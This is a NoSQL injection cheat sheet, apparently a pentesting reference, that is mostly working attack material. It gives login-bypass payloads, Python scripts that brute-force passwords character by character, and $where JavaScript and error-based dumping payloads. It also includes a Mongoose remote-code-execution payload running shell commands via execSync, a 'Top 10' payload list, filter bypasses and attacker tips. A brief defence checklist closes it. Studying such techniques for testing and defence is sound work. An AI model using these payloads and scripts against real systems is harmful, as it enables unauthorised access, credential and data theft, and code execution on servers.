## Overview

NoSQL databases (MongoDB, CouchDB, etc.) don't use traditional SQL syntax but are still vulnerable to injection attacks. They offer looser consistency and fewer relational constraints for performance, but user input can manipulate NoSQL operators like `$ne`, `$gt`, `$regex`, `$where`, and `$func` to bypass authentication, extract data, or even execute code.

---

## Exploitation Methods

### 🎯 Authentication Bypass

**Basic bypasses using operators:**

```bash
# URL-encoded
username[$ne]=toto&password[$ne]=toto
username[$gt]=&password[$gt]=
login[$regex]=.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

# In JSON payload
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

**How it works:**

- `$ne` = "not equal" — matches anything that isn't the value
- `$gt` = "greater than" — empty string is often truthy
- `$regex` = pattern matching for brute-forcing

---

### 🔍 Extract Length Information

```bash
username[$ne]=toto&password[$regex]=.{1}   # True if password length = 1
username[$ne]=toto&password[$regex]=.{3}   # True if password length = 3
```

**Brute-force length until response changes.**

---

### 📦 Extract Data Character-by-Character

```bash
# URL-encoded (assuming length = 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

# Faster wildcard method
username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

# JSON payload
{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}
```

**Automated Python script (POST):**

```python
import requests, string

username = "admin"
password = ""
url = "http://example.org/login"
headers = {'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s"}}' % (username, password + c)
            r = requests.post(url, data=payload, headers=headers, verify=False, allow_redirects=False)
            if 'OK' in r.text or r.status_code == 302:
                print(f"[+] Found: {password + c}")
                password += c
                break
```

**Automated Python script (GET):**

```python
import requests, string

username = 'admin'
password = ''
url = 'http://example.org/login'

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','#','&','$']:
            payload = f'?username={username}&password[$regex]=^{password + c}'
            r = requests.get(url + payload)
            if 'Yeah' in r.text:
                print(f"[+] Found: {password + c}")
                password += c
                break
```

---

### ⚙️ SQL-to-Mongo Injection (JavaScript Execution)

When apps use `$where` with string concatenation:

```javascript
query = { $where: `this.username == '${username}'` }
```

**Payloads:**

```bash
# Tautology-based bypass
admin' || 'a'=='a
' || 1==1//
' || 1==1%00

# Field existence check
/?search=admin' && this.password%00

# Password extraction via regex
/?search=admin' && this.password.match(/^a.*$/)%00
/?search=admin' && this.password.match(/^b.*$/)%00
/?search=admin' && this.password.match(/^duvj78i3u$/)%00
```

---

### 🧨 Error-Based Injection

Force the server to leak data through errors:

```json
{"$where": "this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}
```

**Result:** Full document dumped in error message (if app leaks errors).

---

### 💀 PHP Arbitrary Function Execution

If using **MongoLite** library:

```json
{"user": {"$func": "var_dump"}}
```

This executes `var_dump()` server-side. Can chain to RCE.

---

### 🔓 Cross-Collection Data Leakage

Use `$lookup` (only works if `aggregate()` is used):

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "resultado",
      "pipeline": [
        {
          "$match": {
            "password": {"$regex": "^.*"}
          }
        }
      ]
    }
  }
]
```

**Reads from another collection (`users`) and dumps all matching docs.**

---

### 🧪 Timing-Based Blind Injection

```bash
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

Measure response time to confirm vulnerability.

---

## Recent CVEs & High-Impact Bugs

### 🔥 CVE-2023-28359 — Rocket.Chat Blind NoSQLi

- **Versions:** ≤ 6.0.0
- **Impact:** Unauthenticated attacker could exfiltrate docs using timing oracle
- **Payload:** `{"$where":"sleep(2000)||true"}`
- **Fixed:** v6.0.1

### 🔥 CVE-2024-53900 & CVE-2025-23061 — Mongoose RCE

- **Versions:** Mongoose ≤ 8.8.2
- **Impact:** `populate().match()` allowed `$where` to execute **Node.js JavaScript**, not just MongoDB JS
- **Payload:**
    
    ```js
    // GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
    ```
    
- **Bypass (CVE-2025-23061):** Nested `$where` under `$or` bypassed first patch
- **Fixed:** v8.9.5 + new `sanitizeFilter: true` option

### 🔥 GraphQL → Mongo Filter Injection

```graphql
query users($f:UserFilter) {
  users(filter:$f) { _id email }
}

# Variables:
{ "f": { "$ne": {} } }
```

**Impact:** Dumps all users if filter is passed directly to `find()`.

---

## Modern Robust Payloads (Top 10)

```bash
# 1. Authentication bypass (JSON)
{"username": {"$ne": null}, "password": {"$ne": null}}

# 2. Authentication bypass (URL)
username[$ne]=toto&password[$ne]=toto

# 3. Regex wildcard
username[$regex]=.*&password[$regex]=.*

# 4. Field existence check
username[$exists]=true&password[$exists]=true

# 5. Tautology injection
' || 1==1//

# 6. Timing-based confirmation
';sleep(5000);

# 7. Error-based data extraction
{"$where": "throw new Error(JSON.stringify(this))"}

# 8. Cross-collection lookup
[{"$lookup":{"from":"users","as":"res","pipeline":[{"$match":{"password":{"$regex":"^.*"}}}]}}]

# 9. Mongoose RCE (if vulnerable)
author[$where]=global.process.mainModule.require('child_process').execSync('whoami')

# 10. Blind extraction starter
{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}
```

---

## Bypasses

### Operator Blacklist Bypass

If `$where` is blocked at top level:

```json
{"$or": [{"$where": "malicious_code"}]}
```

### PHP Array Injection

Change parameter format:

```
username=admin  →  username[$ne]=admin
```

### GraphQL Nested Operators

```graphql
{ "filter": { "$or": [{"admin": true}, {"$ne": {}}] } }
```

---

## Tools

- **NoSQLMap:** [github.com/codingo/NoSQLMap](https://github.com/codingo/NoSQLMap)
- **NoSQL Attack Suite:** [github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)
- **nosqli:** [github.com/Charlie-belmer/nosqli](https://github.com/Charlie-belmer/nosqli)
- **StealthNoSQL:** [github.com/ImKKingshuk/StealthNoSQL](https://github.com/ImKKingshuk/StealthNoSQL)
- **Username/Password Enum:** [github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)

**Quick scan:**

```bash
nosqli scan -t http://target.com/user/lookup?username=test
```

---

## Mitigations (Defense Checklist)

✅ **Strip all keys starting with `$`**  
Use: `express-mongo-sanitize`, `mongo-sanitize`, or Mongoose `sanitizeFilter: true`

✅ **Disable server-side JavaScript**  
MongoDB flag: `--noscripting` (default in v7.0+)

✅ **Never use `$where` with user input**  
Use `$expr` or aggregation builders instead

✅ **Validate data types early**  
Use Joi/Ajv to reject arrays where scalars are expected (blocks `[$ne]` tricks)

✅ **GraphQL: Use allow-lists**  
Never spread untrusted objects into queries

✅ **Parameterize queries**  
Treat user input as data, not code

---

## References

- [HackTricks NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [NullSweep Primer](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [Sensepost Error-Based Injection](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [CVE-2023-28359 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-28359)
- [Mongoose CVE-2025-23061 Analysis](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)
- [Intigriti NoSQLi Exploitation](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities)

---

**🎯 Pro Tips:**

- Always test both GET and POST methods
- Check JSON, URL params, and GraphQL inputs
- Look for login forms, search bars, and API filters
- Use timing attacks when blind
- Check for MongoDB status endpoint: `mongodbserver:port/status?text=1`